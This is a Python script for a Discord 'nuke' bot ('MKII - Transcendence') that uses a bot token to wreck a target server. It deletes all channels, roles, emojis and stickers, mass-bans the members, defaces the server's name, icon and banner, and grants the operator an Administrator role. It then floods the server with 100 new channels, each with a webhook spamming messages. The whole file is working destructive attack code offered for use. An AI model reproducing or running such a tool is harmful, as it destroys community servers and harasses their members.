import os
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
import asyncio, aiohttp, time, base64, json, pygame, sys; from io import BytesIO; from PIL import Image
pygame.mixer.init()

def clear_console(): # make a feature for single feature
    if os.name == 'nt': os.system('cls')
    else: os.system('clear')

def get_compressed_media(image_path):
    try:
        with Image.open(image_path) as img:
            if img.mode != 'RGB': img = img.convert('RGB')
            img = img.resize((240, 240), Image.Resampling.LANCZOS)
            buffer = BytesIO(); img.save(buffer, format="JPEG", quality=85)
            encoded_string = base64.b64encode(buffer.getvalue()).decode('utf-8')
            return f"data:image/jpeg;base64,{encoded_string}"
    except Exception as e: print(f"Error processing image: {e}")
    return None

with open("mkii_config.json", "r", encoding="utf-8") as f: config = json.load(f)
enable_logo = config.get("enable_logo", "False")
if enable_logo == "True":
    with open("logo.txt", 'r', encoding='utf-8') as file:
        logo = file.read()
        line = "<════════════════════════════════════════════════════[+]════════════════════════════════════════════════════>"
        space = "                                 "
else: logo, line, space = "[!]: Parameter <enable_logo> is False", "", "> "
clear_console()

print(f"\n{logo}")
print(f'''
> Version: MKII - Transcendence

{line}
{space}Nuke sequence ready <|> Made by Daniel Conclux
{line}

''')

time.sleep(0.1)
pygame.mixer.Sound("SFX\\audio3.mp3").play()
print("This guild will be subjected to total erasure.")
TARGET_GUILD = input("01: Enter target guild ID: \n")
pygame.mixer.Sound("SFX\\audio3.mp3").play()
print("This user will be excluded from mass banning and receive Administrator permissions.")

TOKEN = config["token"]
AUTHORIZED_USER = input("02: Enter your user ID: \n")
CHANNEL_NAME = config["channel_name"]
CHANNEL_TOPIC = config["channel_topic"]
ROLE_NAME = config["role_name"]
SERVER_NAME = config["server_name"]
MESSAGE_SPAM = config["message_spam"]
WEBHOOK_NAME = config["webhook_name"]
EMOJI_NAME = config["emoji_name"]
ICON = get_compressed_media("Media\\icon.png")
BANNER = get_compressed_media("Media\\banner.png")
DESCRIPTIONS = config["server_descriptions"]
BASE_URL = "https://discord.com/api/v10"
HEADERS = {"Authorization": f"Bot {TOKEN}"}

pygame.mixer.Sound("SFX\\audio1.mp3").play()
print("\n---[ NUKE SEQUENCE INITITATED ]---")

class TranscendenceAutomator:
    def __init__(self): self.connector = None; self.total_requests = 0; self.limit = asyncio.Semaphore(50); self.total_pings = 0

    async def req(self, session, method, endpoint, json=None, label="", retries=3):
        current_headers = HEADERS.copy()
        if json is not None: current_headers["Content-Type"] = "application/json"
        for attempt in range(retries):
            try:
                self.total_requests += 1
                async with session.request(method, f"{BASE_URL}{endpoint}", json=json, headers=current_headers) as resp:
                    if resp.status in [200, 201, 204]:
                        if label: print(f"[SUCCESS]: {label}")
                        pygame.mixer.Sound("SFX\\audio3.mp3").play()
                        return await resp.json() if resp.status != 204 else True
                    elif resp.status == 429:
                        data = await resp.json(); wait = data.get('retry_after', 1)
                        print(f"[RATE LIMIT]: Retry after {wait}s")
                        pygame.mixer.Sound("SFX\\audio2.mp3").play()
                        await asyncio.sleep(wait)
                        return await self.req(session, method, endpoint, json, label, retries - 1)
                    elif resp.status >= 500: await asyncio.sleep(1); continue
                    elif resp.status >= 403:
                        error_data = await resp.json()
                        print(f"[ERROR {resp.status}]: {label} - {error_data.get('message', 'No message')}")
                        pygame.mixer.Sound("SFX\\audio2.mp3").play()
                    elif resp.status >= 400:
                        error_data = await resp.json()
                        print(f"[ERROR {resp.status}]: {label} - {error_data.get('message', 'No message')}")
                        pygame.mixer.Sound("SFX\\audio2.mp3").play()
                return None
            except (aiohttp.ClientError, asyncio.TimeoutError, aiohttp.ServerDisconnectedError) as e:
                if attempt < retries - 1: await asyncio.sleep(1); continue
                else:
                    if label: print(f"[ERROR]: {label} failed after {retries} attempts: {e}")
                    pygame.mixer.Sound("SFX\\audio3.mp3").play(); return None
        return None

    async def emoji_spam(self, session): await self.req(session, "POST", f"/guilds/{TARGET_GUILD}/emojis", json={"name": EMOJI_NAME, "image": ICON}, label="Emoji Spam")

    async def saturation(self, session, hook_id, hook_token):
        for _ in range(100000):
            if await self.req(session, "POST", f"/webhooks/{hook_id}/{hook_token}", json={"content": MESSAGE_SPAM}): self.total_requests += 1; self.total_pings += 1

    async def reconstruction(self, session):
        async with self.limit:
            c_name = CHANNEL_NAME
            c_topic = CHANNEL_TOPIC
            chan = await self.req(session, "POST", f"/guilds/{TARGET_GUILD}/channels", json={"name": c_name, "topic": c_topic, "type": 0}, label=f"Create Channel: {c_name}")
            if chan:
                payload = {"name": WEBHOOK_NAME, "avatar": ICON}; self.total_requests += 1
                hook = await self.req(session, "POST", f"/channels/{chan['id']}/webhooks", json=payload, label=f"Create Webhook in {c_name}")
                if hook: asyncio.create_task(self.saturation(session, hook['id'], hook['token'])); self.total_requests += 1

    async def fetch_member_ids(self, session):
        user_ids = []; last_user_id = 0
        while True:
            batch = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/members?limit=1000&after={last_user_id}", label="Fetch Users")
            if not batch: break
            for member in batch: user_ids.append(member['user']['id'])
            last_user_id = user_ids[-1]; self.total_requests += 1
            if len(batch) < 1000: break
        return user_ids
    
    async def massban(self, session, g_users, guild_owner):
        await asyncio.sleep(5); tasks = []
        for u in g_users:
            if u == AUTHORIZED_USER or (guild_owner and u == guild_owner): continue
            tasks.append(self.req(session, "PUT", f"/guilds/{TARGET_GUILD}/bans/{u}", json={}, label=f"Ban User: {u}"))
            self.total_requests += 1
        if tasks: await asyncio.gather(*tasks)

    async def start(self):
        self.connector = aiohttp.TCPConnector(limit=150)
        async with aiohttp.ClientSession(headers=HEADERS, connector=self.connector) as session:
            bot_json = await self.req(session, "GET", "/users/@me", label="\nToken Validation") or {}
            bot_data = f"{bot_json.get('username', 'Unknown')}#{bot_json.get('discriminator', '0000')}"
            print(f"[BOT]: Logged in as {bot_data}")
            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 1: Fetching ] ---\n")
            g_chans = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/channels", label="Fetch Channels") or []
            print(f"[FETCH]: Total channels: {len(g_chans)}"); pygame.mixer.Sound("SFX\\audio3.mp3").play()
            g_roles = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/roles", label="Fetch Roles") or []
            print(f"[FETCH]: Total roles: {len(g_roles)}"); pygame.mixer.Sound("SFX\\audio3.mp3").play()
            g_emojis = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/emojis", label="Fetch Emojis") or []
            print(f"[FETCH]: Total emojis: {len(g_emojis)}"); pygame.mixer.Sound("SFX\\audio3.mp3").play()
            g_stickers = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/stickers", label="Fetch Stickers") or []
            print(f"[FETCH]: Total stickers: {len(g_stickers)}"); pygame.mixer.Sound("SFX\\audio3.mp3").play()
            g_users = await self.fetch_member_ids(session)
            print(f"[FETCH]: Total members: {len(g_users)}"); pygame.mixer.Sound("SFX\\audio3.mp3").play()
            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 2: Erasure ] ---\n")
            tasks = [self.req(session, "DELETE", f"/channels/{c['id']}", label=f"Delete Channel: {c['name']}") for c in g_chans]
            tasks += [self.req(session, "DELETE", f"/guilds/{TARGET_GUILD}/roles/{r['id']}", label=f"Delete Role: {r['name']}")
                      for r in g_roles if not r['managed'] and r['name'] != "@everyone"]
            tasks += [self.req(session, "DELETE", f"/guilds/{TARGET_GUILD}/emojis/{e['id']}", label=f"Delete Emoji: {e['name']}") for e in g_emojis]
            tasks += [self.req(session, "DELETE", f"/guilds/{TARGET_GUILD}/stickers/{s['id']}", label=f"Delete Sticker: {s['name']}") for s in g_stickers]
            guild_data = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}", label=None); guild_owner = None
            if guild_data: guild_owner = guild_data.get("owner_id")
            await asyncio.gather(*tasks, self.massban(session, g_users, guild_owner))
            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 3: Defamation ] ---\n")
            new_identity = {"name": SERVER_NAME, "icon": ICON, "banner": BANNER, "description": DESCRIPTIONS}
            await self.req(session, "PATCH", f"/guilds/{TARGET_GUILD}", json=new_identity, label="Change Server profile")
            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 4: Reconstruction ] ---\n")
            role = await self.req(session, "POST", f"/guilds/{TARGET_GUILD}/ roles", json={"name": ROLE_NAME, "permissions": "8"}, label=f"Create Admin Role: {ROLE_NAME}")
            if role: await self.req(session, "PUT", f"/guilds/{TARGET_GUILD}/members/{AUTHORIZED_USER}/roles/{role['id']}")
            build_tasks = [self.reconstruction(session) for _ in range(100)]; emoji_tasks = [self.emoji_spam(session) for _ in range(100)]
            await asyncio.gather(*(build_tasks + emoji_tasks))
            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 5: Saturation ] ---\n")

if TARGET_GUILD == "":
    time.sleep(0.5); print("\n[!]: Parameter <Guild ID> is undefined\n")
    pygame.mixer.Sound("SFX\\audio2.mp3").play()
    input("Press enter to restart:")
    with open("asc_mkii.py", encoding="utf-8") as f: exec(f.read())
    sys.exit(0)

if AUTHORIZED_USER == "": print("\n[!]: Caution: Parameter <User ID> is undefined")

if __name__ == "__main__":
    automator = TranscendenceAutomator(); start = time.perf_counter()
    try: asyncio.run(automator.start())
    except KeyboardInterrupt:
        pygame.mixer.Sound("SFX\\audio2.mp3").play()
        print("\n[!]: Operation cancelled by user, terminating session in 1 second\n")
    print(f"\n[+]: Total sequence time: {time.perf_counter() - start:.2f}s - Total Pings: {automator.total_pings} / Requests: {automator.total_requests}\n")
    pygame.mixer.Sound("SFX\\audio3.mp3").play()
    time.sleep(1)

if RuntimeError:
    pygame.mixer.Sound("SFX\\audio2.mp3").play()
    print(f"\n[X]: Runtime Error occurred, terminating session in 1 second\n")
    time.sleep(1)